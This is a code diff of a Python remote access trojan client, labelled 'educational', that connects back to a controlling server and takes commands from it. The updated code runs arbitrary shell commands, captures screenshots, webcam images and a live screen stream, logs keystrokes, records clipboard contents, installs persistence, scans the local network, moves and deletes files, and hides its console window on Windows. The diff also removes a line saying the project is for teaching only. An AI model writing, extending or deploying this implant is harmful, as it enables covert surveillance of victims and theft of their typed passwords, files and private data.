@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# ⚠️ Ce projet est à but pédagogique uniquement. Toute utilisation non autorisée est strictement interdite.
 # Educational RAT Client - For learning purposes only
 # This program should only be used in controlled test environments
 
@@ -9,552 +8,577 @@ import os
 import platform
 import time
 import sys
-import base64
-import ipaddress
-from threading import Thread
-import logging
 import json
+import logging
+import io
+import threading
 
-# Global variables
-SERVER_HOST = "10.25.117.168"  # Change this to your server IP
-SERVER_PORT = 4444         # Default port (must match server)
-BUFFER_SIZE = 4096
-CONNECTION_RETRY = 10      # Seconds between connection attempts
-AUTH_USERNAME = "admin"    # Default username for authentication
-AUTH_PASSWORD = "password" # Default password for authentication
+SERVER_HOST = "127.0.0.1"
+SERVER_PORT = 4444
+BUFFER_SIZE = 65536
+CONNECTION_RETRY = 10
+AUTH_USERNAME = "admin"
+AUTH_PASSWORD = "password"
+ENCRYPTION_KEY = "edu_rat_default_key"
 
-# Setup logging
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
-    handlers=[
-        logging.FileHandler("client_log.txt"),
-        logging.StreamHandler()
-    ]
+    handlers=[logging.StreamHandler()]
 )
 logger = logging.getLogger(__name__)
 
-# Try to import screenshot functionality, but continue if not available
+# Import crypto module
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+try:
+    from crypto_utils import send_msg, recv_msg, recv_msg_str, derive_key
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+    import struct
+    def send_msg(sock, data, key=None):
+        if isinstance(data, str): data = data.encode()
+        sock.sendall(struct.pack('>I', len(data)) + data)
+    def recv_msg(sock, key=None):
+        raw = b""
+        while len(raw) < 4:
+            c = sock.recv(4 - len(raw))
+            if not c: return None
+            raw += c
+        n = struct.unpack('>I', raw)[0]
+        if n == 0: return b""
+        if n > 50_000_000: return None
+        data = b""
+        while len(data) < n:
+            c = sock.recv(min(65536, n - len(data)))
+            if not c: return None
+            data += c
+        return data
+    def recv_msg_str(sock, key=None):
+        d = recv_msg(sock, key)
+        return d.decode(errors='replace') if d is not None else None
+    def derive_key(password): return None
+
 try:
     import pyautogui
     SCREENSHOT_AVAILABLE = True
-    logger.info("Screenshot functionality is available")
 except ImportError:
     SCREENSHOT_AVAILABLE = False
-    logger.warning("Screenshot functionality not available. Install pyautogui for screenshots.")
 
-# Try to import webcam functionality, but continue if not available
 WEBCAM_AVAILABLE = False
 try:
     import cv2
     WEBCAM_AVAILABLE = True
-    logger.info("Webcam functionality is available")
 except ImportError:
-    logger.warning("Webcam functionality not available. Install opencv-python for webcam access.")
+    pass
 
-# Try to import keylogger functionality
 KEYLOGGER_AVAILABLE = False
 try:
     from pynput import keyboard
     KEYLOGGER_AVAILABLE = True
-    logger.info("Keylogger functionality is available")
 except ImportError:
-    logger.warning("Keylogger functionality not available. Install pynput for keylogging.")
+    pass
 
-def encrypt_data(data):
-    """Simple encryption function (for educational purposes only)"""
-    # Convert to bytes if it's a string
-    if isinstance(data, str):
-        data = data.encode()
-    
-    # Use base64 for basic obfuscation
-    return base64.b64encode(data)
+CLIPBOARD_AVAILABLE = False
+try:
+    import pyperclip
+    CLIPBOARD_AVAILABLE = True
+except ImportError:
+    pass
 
-def decrypt_data(data):
-    """Simple decryption function (for educational purposes only)"""
-    # Decrypt base64
-    return base64.b64decode(data)
+try:
+    from persistence import install_persistence, remove_persistence, check_persistence, get_persistence_methods
+    PERSISTENCE_AVAILABLE = True
+except ImportError:
+    PERSISTENCE_AVAILABLE = False
 
-def secure_send(sock, data):
-    """Send encrypted data to the server"""
-    try:
-        if isinstance(data, str):
-            data = data.encode()
-        encrypted_data = encrypt_data(data)
-        sock.send(encrypted_data)
-        return True
-    except Exception as e:
-        logger.error(f"Error sending encrypted data: {e}")
-        return False
+try:
+    from network_scanner import scan_network, scan_ports, get_local_network, full_scan_report, get_arp_table
+    SCANNER_AVAILABLE = True
+except ImportError:
+    SCANNER_AVAILABLE = False
 
-def secure_recv(sock, buffer_size=BUFFER_SIZE):
-    """Receive and decrypt data from the server"""
-    try:
-        encrypted_data = sock.recv(buffer_size)
-        if not encrypted_data:
-            return None
-        decrypted_data = decrypt_data(encrypted_data)
-        return decrypted_data.decode()
-    except Exception as e:
-        logger.error(f"Error receiving encrypted data: {e}")
-        return None
+import ipaddress
 
-def authenticate(client_socket):
-    """Authenticate with the server"""
-    try:
-        # Receive auth request
-        auth_request = secure_recv(client_socket)
-        if auth_request == "AUTH":
-            # Send credentials
-            credentials = json.dumps({
-                "username": AUTH_USERNAME,
-                "password": AUTH_PASSWORD
-            })
-            secure_send(client_socket, credentials)
-            
-            # Get authentication response
-            response = secure_recv(client_socket)
-            if response == "AUTH_SUCCESS":
-                logger.info("Authentication successful")
-                return True
-            else:
-                logger.error("Authentication failed")
-                return False
-        return False
-    except Exception as e:
-        logger.error(f"Authentication error: {e}")
-        return False
 
-def ping_host(host):
-    """Ping the host to check if it's reachable"""
-    param = '-n' if platform.system().lower() == 'windows' else '-c'
-    command = ['ping', param, '1', host]
-    try:
-        return subprocess.call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
-    except:
-        return False
+def _compute_backoff_delays(n_failures):
+    """Retourne la liste des delais pour n echecs consecutifs (cap 60s)."""
+    delays = []
+    d = 1
+    for _ in range(n_failures):
+        delays.append(d)
+        d = min(d * 2, 60)
+    return delays
+
 
 def test_connection(host, port):
-    """Test connectivity to the server and provide diagnostic information"""
-    logger.info(f"Testing connection to {host}:{port}...")
-    
-    # First, check if we can ping the host
-    if not ping_host(host):
-        logger.error(f"Cannot ping {host}. Host may be down or not accepting ICMP packets.")
-    
-    # Check if we're trying to connect to localhost from possibly another machine
-    is_local_ip = False
+    logger.info(f"Target server: {host}:{port}")
     try:
-        ip_obj = ipaddress.ip_address(host)
-        is_local_ip = ip_obj.is_loopback
-    except:
-        if host in ["localhost", "127.0.0.1"]:
-            is_local_ip = True
-    
-    if is_local_ip:
-        logger.warning("Using localhost/127.0.0.1 - this only works if client and server are on the same machine")
-        logger.warning("For different machines, the server needs to use its LAN IP address")
-    
-    # Test TCP connection
+        import ipaddress
+        ip = ipaddress.ip_address(host)
+        if ip.is_loopback:
+            logger.info("Using loopback (same machine only)")
+    except (ValueError, ImportError):
+        pass
+
+
+def authenticate(sock, key):
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(3)
-        s.connect((host, port))
-        s.close()
-        logger.info("Connection successful! Server is reachable.")
-        return True
-    except ConnectionRefusedError:
-        logger.error("Connection refused. The server is not running or is blocking connections.")
-        logger.info("Troubleshooting steps:")
-        logger.info("    1. Make sure the server is running")
-        logger.info("    2. Check that the server IP and port are correct")
-        logger.info("    3. Check Windows Firewall settings and allow Python in the rules")
-        logger.info(f"    4. Verify the port {port} is not blocked")
-        return False
-    except socket.timeout:
-        logger.error("Connection timed out. The server might be:")
-        logger.info("    1. Behind a firewall")
-        logger.info("    2. On a different network segment")
-        logger.info("    3. IP address might be incorrect")
-        return False
-    except socket.gaierror:
-        logger.error(f"Address error. Unable to resolve hostname {host}")
-        logger.info("    Please use an IP address instead of a hostname")
-        return False
+        auth_request = recv_msg_str(sock, key)
+        if auth_request != "AUTH":
+            return False
+        credentials = json.dumps({"username": AUTH_USERNAME, "password": AUTH_PASSWORD})
+        send_msg(sock, credentials, key)
+        response = recv_msg_str(sock, key)
+        if response == "AUTH_SUCCESS":
+            logger.info("Authentication successful")
+            return True
+        else:
+            logger.error("Authentication failed")
+            return False
     except Exception as e:
-        logger.error(f"Connection error: {str(e)}")
+        logger.error(f"Auth error: {e}")
         return False
 
+
 def get_system_info():
-    """Get system information for identification"""
-    system = platform.system()
     info = {
-        "System": system,
+        "System": platform.system(),
         "Node": platform.node(),
         "Release": platform.release(),
         "Version": platform.version(),
         "Machine": platform.machine(),
         "Processor": platform.processor(),
-        "Username": os.getlogin() if hasattr(os, 'getlogin') else 'Unknown'
     }
-    
-    # Get more detailed OS-specific information
-    if system == "Windows":
-        try:
-            import wmi
-            c = wmi.WMI()
-            os_info = c.Win32_OperatingSystem()[0]
-            info["OS"] = f"{os_info.Caption} {os_info.OSArchitecture}"
-        except:
-            pass
-    
+    try:
+        info["Username"] = os.getlogin()
+    except:
+        info["Username"] = os.environ.get("USER", os.environ.get("USERNAME", "Unknown"))
     return " | ".join([f"{k}: {v}" for k, v in info.items()])
 
+
 def execute_command(command):
-    """Execute a shell command and return its output"""
-    # Determine appropriate shell based on OS
-    shell = True if platform.system() == "Windows" else False
-    
     try:
-        # Split command into parts for Linux/Mac
-        cmd_parts = command.split() if not shell else command
-        
-        # Execute the command
-        process = subprocess.Popen(
-            cmd_parts, 
-            shell=shell,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            stdin=subprocess.PIPE
-        )
-        
-        # Get command output
-        stdout, stderr = process.communicate()
-        
-        if stderr:
-            result = stderr.decode()
+        if platform.system() == "Windows":
+            process = subprocess.Popen(
+                command, shell=True,
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
+            )
         else:
-            result = stdout.decode()
-            
-        # Handle empty output
-        if not result:
-            result = "[+] Command executed successfully (no output)"
-            
+            process = subprocess.Popen(
+                command.split(), shell=False,
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
+            )
+        stdout, stderr = process.communicate(timeout=30)
+        result = stdout.decode(errors='replace') + stderr.decode(errors='replace')
+        if not result.strip():
+            result = "[+] Command executed (no output)"
         return result
-        
+    except subprocess.TimeoutExpired:
+        return "[!] Command timed out (30s)"
     except Exception as e:
-        return f"[!] Error executing command: {str(e)}"
+        return f"[!] Error: {str(e)}"
 
-def upload_file(client_socket, file_path):
-    """Upload a file to the server"""
+
+def list_directory(path):
     try:
-        if not os.path.exists(file_path):
-            secure_send(client_socket, "File not found")
-            return
-        
-        # Get file size and send it to server
-        file_size = os.path.getsize(file_path)
-        secure_send(client_socket, str(file_size).zfill(10))
-        
-        # Wait for server to be ready
-        response = secure_recv(client_socket)
-        
-        if response == "ready":
-            # Send the file in chunks
-            with open(file_path, "rb") as f:
-                data = f.read(BUFFER_SIZE)
-                while data:
-                    client_socket.send(encrypt_data(data))  # Encrypt each chunk
-                    data = f.read(BUFFER_SIZE)
-            
-            return True
-        return False
-        
+        if not path or path == ".":
+            path = os.getcwd()
+        entries = []
+        for item in sorted(os.listdir(path)):
+            full = os.path.join(path, item)
+            if os.path.isdir(full):
+                entries.append(f"[DIR] {item}")
+            else:
+                try:
+                    size = os.path.getsize(full)
+                    entries.append(f"{item} ({size} bytes)")
+                except:
+                    entries.append(item)
+        return "\n".join(entries) if entries else "[Empty directory]"
     except Exception as e:
-        logger.error(f"Error uploading file: {e}")
-        return False
+        return f"[!] Error: {e}"
 
-def download_file(client_socket, file_path):
-    """Download a file from the server"""
-    try:
-        # Get file size
-        file_size_data = secure_recv(client_socket)
-        file_size = int(file_size_data)
-        
-        # Tell server we're ready to receive
-        secure_send(client_socket, "ready")
-        
-        # Receive file data
-        received_data = b""
-        remaining_bytes = file_size
-        
-        while remaining_bytes > 0:
-            data = client_socket.recv(min(BUFFER_SIZE, remaining_bytes))
-            if not data:
-                break
-                
-            # Decrypt each chunk
-            decrypted_data = decrypt_data(data)
-            received_data += decrypted_data
-            remaining_bytes -= len(decrypted_data)
-        
-        # Save the file
-        with open(file_path, "wb") as f:
-            f.write(received_data)
-            
-        secure_send(client_socket, "[+] File downloaded successfully")
-        return True
-        
-    except Exception as e:
-        secure_send(client_socket, f"[!] Error downloading file: {str(e)}")
-        return False
 
-def take_screenshot(client_socket):
-    """Capture screen and send to server"""
+def take_screenshot(sock, key):
     if not SCREENSHOT_AVAILABLE:
-        secure_send(client_socket, "FAIL")
+        send_msg(sock, "FAIL", key)
         return
-    
     try:
-        # Take screenshot based on OS
-        if platform.system() == "Windows" or platform.system() == "Darwin":  # Windows or macOS
-            screenshot = pyautogui.screenshot()
-        else:  # Linux
-            try:
-                import pyscreenshot as ImageGrab
-                screenshot = ImageGrab.grab()
-            except ImportError:
-                screenshot = pyautogui.screenshot()
-        
-        # Convert to bytes
-        import io
+        screenshot = pyautogui.screenshot()
         img_bytes = io.BytesIO()
         screenshot.save(img_bytes, format="PNG")
-        screenshot_data = img_bytes.getvalue()
-        
-        # Send screenshot size to server
-        size = len(screenshot_data)
-        secure_send(client_socket, "PASS")
-        secure_send(client_socket, str(size).zfill(10))
-        
-        # Wait for server ready signal
-        secure_recv(client_socket)
-        
-        # Send screenshot data
-        client_socket.sendall(encrypt_data(screenshot_data))
-        
+        send_msg(sock, "PASS", key)
+        send_msg(sock, img_bytes.getvalue(), key)
     except Exception as e:
-        secure_send(client_socket, "FAIL")
-        logger.error(f"Error taking screenshot: {e}")
+        send_msg(sock, "FAIL", key)
+        logger.error(f"Screenshot error: {e}")
 
-def capture_webcam(client_socket):
-    """Capture an image from webcam and send to server"""
+
+def capture_webcam(sock, key):
     if not WEBCAM_AVAILABLE:
-        secure_send(client_socket, "FAIL")
-        logger.warning("Webcam capture failed: OpenCV not available")
+        send_msg(sock, "FAIL", key)
         return
-    
     try:
-        # Initialize webcam
         cap = cv2.VideoCapture(0)
         if not cap.isOpened():
-            secure_send(client_socket, "FAIL")
-            logger.warning("Failed to open webcam")
+            send_msg(sock, "FAIL", key)
             return
-            
-        # Capture a frame
         ret, frame = cap.read()
         cap.release()
-        
         if not ret:
-            secure_send(client_socket, "FAIL")
-            logger.warning("Failed to capture image from webcam")
+            send_msg(sock, "FAIL", key)
             return
-        
-        # Convert to JPG
         ret, buffer = cv2.imencode('.jpg', frame)
         if not ret:
-            secure_send(client_socket, "FAIL")
+            send_msg(sock, "FAIL", key)
             return
-            
-        jpg_data = buffer.tobytes()
-        
-        # Send image size to server
-        size = len(jpg_data)
-        secure_send(client_socket, "PASS")
-        secure_send(client_socket, str(size).zfill(10))
-        
-        # Wait for server ready signal
-        secure_recv(client_socket)
-        
-        # Send image data
-        client_socket.sendall(encrypt_data(jpg_data))
-        
+        send_msg(sock, "PASS", key)
+        send_msg(sock, buffer.tobytes(), key)
     except Exception as e:
-        secure_send(client_socket, "FAIL")
-        logger.error(f"Error capturing webcam: {e}")
+        send_msg(sock, "FAIL", key)
+        logger.error(f"Webcam error: {e}")
+
+
+def stream_screen(sock, key, stop_event):
+    """Stream screen at low fps for live view"""
+    if not SCREENSHOT_AVAILABLE:
+        send_msg(sock, "FAIL", key)
+        return
+    send_msg(sock, "PASS", key)
+    try:
+        while not stop_event.is_set():
+            screenshot = pyautogui.screenshot()
+            screenshot = screenshot.resize((screenshot.width // 2, screenshot.height // 2))
+            img_bytes = io.BytesIO()
+            screenshot.save(img_bytes, format="JPEG", quality=40)
+            frame_data = img_bytes.getvalue()
+            send_msg(sock, frame_data, key)
+            ack = recv_msg_str(sock, key)
+            if ack != "NEXT":
+                break
+            time.sleep(0.3)
+    except Exception as e:
+        logger.error(f"Stream error: {e}")
+    finally:
+        try:
+            send_msg(sock, b"STREAM_END", key)
+        except:
+            pass
+
 
 class Keylogger:
     def __init__(self):
-        self.log_file = os.path.join(os.environ.get('TEMP', '/tmp'), 'keylog.txt')
+        self.log_data = []
         self.listener = None
         self.running = False
-    
+
     def on_press(self, key):
         try:
-            with open(self.log_file, 'a') as f:
-                if hasattr(key, 'char'):
-                    f.write(key.char)
-                else:
-                    f.write(f'[{key}]')
-        except Exception as e:
-            logger.error(f"Error logging key: {e}")
-    
+            if hasattr(key, 'char') and key.char:
+                self.log_data.append(key.char)
+            else:
+                self.log_data.append(f'[{key}]')
+        except:
+            pass
+
     def start(self):
         if not KEYLOGGER_AVAILABLE:
-            logger.warning("Keylogger not available: pynput not installed")
             return False
-        
         if self.running:
             return True
-            
         try:
-            # Start keylogger in a non-blocking way
             self.listener = keyboard.Listener(on_press=self.on_press)
             self.listener.start()
             self.running = True
             return True
-        except Exception as e:
-            logger.error(f"Error starting keylogger: {e}")
+        except:
             return False
-    
+
     def stop(self):
         if self.running and self.listener:
             self.listener.stop()
             self.running = False
-    
+
     def get_logs(self):
-        if not os.path.exists(self.log_file):
-            return "No keylog data available"
-            
-        try:
-            with open(self.log_file, 'r') as f:
-                logs = f.read()
-                
-            # Optionally clear the log file after reading
-            with open(self.log_file, 'w') as f:
+        data = "".join(self.log_data)
+        self.log_data.clear()
+        return data if data else "No keylog data"
+
+
+class ClipboardMonitor:
+    def __init__(self):
+        self.running = False
+        self.history = []
+        self.last_content = ""
+        self.thread = None
+
+    def start(self):
+        if not CLIPBOARD_AVAILABLE:
+            return False
+        if self.running:
+            return True
+        self.running = True
+        self.thread = threading.Thread(target=self._monitor, daemon=True)
+        self.thread.start()
+        return True
+
+    def _monitor(self):
+        while self.running:
+            try:
+                content = pyperclip.paste()
+                if content and content != self.last_content:
+                    self.last_content = content
+                    self.history.append({
+                        "time": time.strftime("%H:%M:%S"),
+                        "content": content[:500]
+                    })
+            except:
                 pass
-                
-            return logs
-        except Exception as e:
-            logger.error(f"Error reading keylog file: {e}")
-            return f"Error reading keylog: {str(e)}"
+            time.sleep(1)
+
+    def stop(self):
+        self.running = False
+
+    def get_history(self):
+        if not self.history:
+            return "No clipboard data captured"
+        lines = []
+        for entry in self.history:
+            lines.append(f"[{entry['time']}] {entry['content'][:100]}")
+        return "\n".join(lines)
+
+    def clear(self):
+        self.history.clear()
+
 
 def main():
-    """Main function to run the client"""
-    global SERVER_HOST
-    global SERVER_PORT
-    
-    # Test connectivity first
     test_connection(SERVER_HOST, SERVER_PORT)
-    
-    # Initialize keylogger
     keylogger = Keylogger()
-    
-    # Periodically try to connect to the server
+    clipboard_monitor = ClipboardMonitor()
+    stream_stop_event = threading.Event()
+    _reconnect_delay = 1          # backoff exponentiel
+
     while True:
         try:
-            logger.info(f"Attempting to connect to {SERVER_HOST}:{SERVER_PORT}...")
+            logger.info(f"Connecting to {SERVER_HOST}:{SERVER_PORT}... (next retry in {_reconnect_delay}s if fail)")
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client.settimeout(10)
             client.connect((SERVER_HOST, SERVER_PORT))
-            logger.info(f"Connected to {SERVER_HOST}:{SERVER_PORT}")
-            
-            # Authenticate with the server
-            if not authenticate(client):
-                logger.error("Authentication failed. Retrying in 10 seconds.")
+            client.settimeout(None)
+            _reconnect_delay = 1  # reset au succes
+            logger.info("Connected!")
+
+            # Derive encryption key
+            key = derive_key(ENCRYPTION_KEY)
+            if key and CRYPTO_AVAILABLE:
+                logger.info("AES-256 encryption active")
+            else:
+                logger.info("Running without encryption")
+
+            if not authenticate(client, key):
                 client.close()
-                time.sleep(CONNECTION_RETRY)
+                time.sleep(_reconnect_delay)
+                _reconnect_delay = min(_reconnect_delay * 2, 60)
                 continue
-            
+
             while True:
-                # Receive and decrypt command
-                command = secure_recv(client)
-                
-                if not command:
-                    # Connection lost
-                    logger.warning("Connection lost. Attempting to reconnect...")
+                command = recv_msg_str(client, key)
+                if command is None:
+                    logger.warning("Connection lost")
                     break
-                    
-                # Handle specific commands
+
                 if command == "sysinfo":
-                    # System information
-                    response = get_system_info()
-                    secure_send(client, response)
-                    
-                elif command.startswith("download"):
-                    # Send file to server
-                    _, file_path = command.split(" ", 1)
-                    upload_file(client, file_path)
-                    
-                elif command.startswith("upload"):
-                    # Receive file from server
-                    _, file_path = command.split(" ", 1)
-                    download_file(client, file_path)
-                    
+                    send_msg(client, get_system_info(), key)
+
                 elif command == "screenshot":
-                    # Take screenshot and send to server
-                    take_screenshot(client)
-                
+                    take_screenshot(client, key)
+
                 elif command == "webcam":
-                    # Capture image from webcam
-                    capture_webcam(client)
-                
+                    capture_webcam(client, key)
+
+                elif command == "stream_start":
+                    stream_stop_event.clear()
+                    stream_screen(client, key, stream_stop_event)
+
+                elif command == "stream_stop":
+                    stream_stop_event.set()
+                    send_msg(client, "[+] Stream stopped", key)
+
                 elif command == "keylogger_start":
-                    # Start keylogger
                     if keylogger.start():
-                        secure_send(client, "[+] Keylogger started")
+                        send_msg(client, "[+] Keylogger started", key)
                     else:
-                        secure_send(client, "[!] Failed to start keylogger")
-                
+                        send_msg(client, "[!] Keylogger unavailable", key)
+
                 elif command == "keylogger_stop":
-                    # Stop keylogger
                     keylogger.stop()
-                    secure_send(client, "[+] Keylogger stopped")
-                
+                    send_msg(client, "[+] Keylogger stopped", key)
+
                 elif command == "keylogger_dump":
-                    # Get keylogger data
-                    logs = keylogger.get_logs()
-                    secure_send(client, logs)
-                    
+                    send_msg(client, keylogger.get_logs(), key)
+
+                elif command == "clipboard_start":
+                    if clipboard_monitor.start():
+                        send_msg(client, "[+] Clipboard monitor started", key)
+                    else:
+                        send_msg(client, "[!] Clipboard monitor unavailable (pyperclip not installed)", key)
+
+                elif command == "clipboard_stop":
+                    clipboard_monitor.stop()
+                    send_msg(client, "[+] Clipboard monitor stopped", key)
+
+                elif command == "clipboard_dump":
+                    send_msg(client, clipboard_monitor.get_history(), key)
+
+                elif command == "clipboard_current":
+                    try:
+                        if CLIPBOARD_AVAILABLE:
+                            send_msg(client, pyperclip.paste() or "[Empty clipboard]", key)
+                        else:
+                            send_msg(client, "[!] pyperclip not installed", key)
+                    except:
+                        send_msg(client, "[!] Cannot access clipboard", key)
+
+                elif command.startswith("persist_install"):
+                    if not PERSISTENCE_AVAILABLE:
+                        send_msg(client, "[!] Persistence module unavailable", key)
+                        continue
+                    parts = command.split(" ", 1)
+                    method = parts[1] if len(parts) > 1 else None
+                    success, msg = install_persistence(method=method)
+                    send_msg(client, f"{'[+]' if success else '[!]'} {msg}", key)
+
+                elif command == "persist_remove":
+                    if not PERSISTENCE_AVAILABLE:
+                        send_msg(client, "[!] Persistence module unavailable", key)
+                        continue
+                    success, msg = remove_persistence()
+                    send_msg(client, f"{'[+]' if success else '[!]'} {msg}", key)
+
+                elif command == "persist_check":
+                    if not PERSISTENCE_AVAILABLE:
+                        send_msg(client, "[!] Persistence module unavailable", key)
+                        continue
+                    status = check_persistence()
+                    result = "Persistence Status:\n"
+                    for method, active in status.items():
+                        result += f"  {method}: {'ACTIVE' if active else 'inactive'}\n"
+                    send_msg(client, result, key)
+
+                elif command == "persist_methods":
+                    if not PERSISTENCE_AVAILABLE:
+                        send_msg(client, "[!] Persistence module unavailable", key)
+                        continue
+                    methods = get_persistence_methods()
+                    send_msg(client, "Available methods:\n" + "\n".join(f"  - {m}" for m in methods), key)
+
+                elif command == "scan_network":
+                    if not SCANNER_AVAILABLE:
+                        send_msg(client, "[!] Network scanner unavailable", key)
+                        continue
+                    send_msg(client, "[*] Scanning network (this may take a moment)...", key)
+                    # Wait for ack
+                    recv_msg_str(client, key)
+                    report = full_scan_report()
+                    send_msg(client, report, key)
+
+                elif command.startswith("scan_ports "):
+                    if not SCANNER_AVAILABLE:
+                        send_msg(client, "[!] Network scanner unavailable", key)
+                        continue
+                    target = command.split(" ", 1)[1]
+                    results = scan_ports(target)
+                    output = f"Port scan of {target}:\n"
+                    for port, service, is_open in results:
+                        if is_open:
+                            output += f"  {port}/{service}: OPEN\n"
+                    if not any(r[2] for r in results):
+                        output += "  No open ports found\n"
+                    send_msg(client, output, key)
+
+                elif command == "scan_arp":
+                    if not SCANNER_AVAILABLE:
+                        send_msg(client, "[!] Network scanner unavailable", key)
+                        continue
+                    send_msg(client, get_arp_table(), key)
+
+                elif command.startswith("upload "):
+                    filename = command.split(" ", 1)[1]
+                    file_data = recv_msg(client, key)
+                    if file_data is not None:
+                        with open(filename, "wb") as f:
+                            f.write(file_data)
+                        send_msg(client, f"[+] File saved: {filename} ({len(file_data)} bytes)", key)
+                    else:
+                        send_msg(client, "[!] Failed to receive file", key)
+
+                elif command.startswith("download "):
+                    filepath = command.split(" ", 1)[1]
+                    if os.path.isfile(filepath):
+                        send_msg(client, "PASS", key)
+                        with open(filepath, "rb") as f:
+                            send_msg(client, f.read(), key)
+                    else:
+                        send_msg(client, "FAIL", key)
+
+                elif command.startswith("listdir"):
+                    parts = command.split(" ", 1)
+                    path = parts[1] if len(parts) > 1 else "."
+                    send_msg(client, list_directory(path), key)
+
+                elif command.startswith("delete "):
+                    filepath = command.split(" ", 1)[1]
+                    try:
+                        if os.path.isfile(filepath):
+                            os.remove(filepath)
+                            send_msg(client, f"[+] Deleted: {filepath}", key)
+                        else:
+                            send_msg(client, f"[!] Not found: {filepath}", key)
+                    except Exception as e:
+                        send_msg(client, f"[!] Delete error: {e}", key)
+
+                elif command == "capabilities":
+                    caps = {
+                        "screenshot": SCREENSHOT_AVAILABLE,
+                        "webcam": WEBCAM_AVAILABLE,
+                        "keylogger": KEYLOGGER_AVAILABLE,
+                        "clipboard": CLIPBOARD_AVAILABLE,
+                        "persistence": PERSISTENCE_AVAILABLE,
+                        "scanner": SCANNER_AVAILABLE,
+                        "crypto": CRYPTO_AVAILABLE,
+                        "platform": platform.system(),
+                    }
+                    send_msg(client, json.dumps(caps), key)
+
                 elif command == "exit":
-                    # Exit command from server
-                    keylogger.stop()  # Ensure keylogger is stopped
+                    keylogger.stop()
+                    clipboard_monitor.stop()
+                    stream_stop_event.set()
                     client.close()
+                    logger.info("Exit received")
                     sys.exit(0)
-                    
+
                 else:
-                    # Execute shell command
                     response = execute_command(command)
-                    secure_send(client, response)
-                    
+                    send_msg(client, response, key)
+
+        except (ConnectionRefusedError, OSError) as e:
+            logger.warning(f"Connection failed ({e}), retry in {_reconnect_delay}s")
         except Exception as e:
-            logger.error(f"Connection error: {str(e)}")
-            # If connection fails, wait and retry
-            time.sleep(CONNECTION_RETRY)
-            continue
-            
-        # If we get here, the loop has broken - wait and retry
-        time.sleep(CONNECTION_RETRY)
+            logger.error(f"Error: {e}")
+
+        stream_stop_event.set()
+        time.sleep(_reconnect_delay)
+        _reconnect_delay = min(_reconnect_delay * 2, 60)
+
 
 if __name__ == "__main__":
-    logger.info(f"Starting client on {platform.system()} with Python {platform.python_version()}")
-    
-    # Hide console window on Windows if possible
+    logger.info(f"Client on {platform.system()} Python {platform.python_version()}")
     if platform.system() == "Windows":
         try:
             import ctypes
             ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
         except:
             pass
-    
-    main() 
+    main()
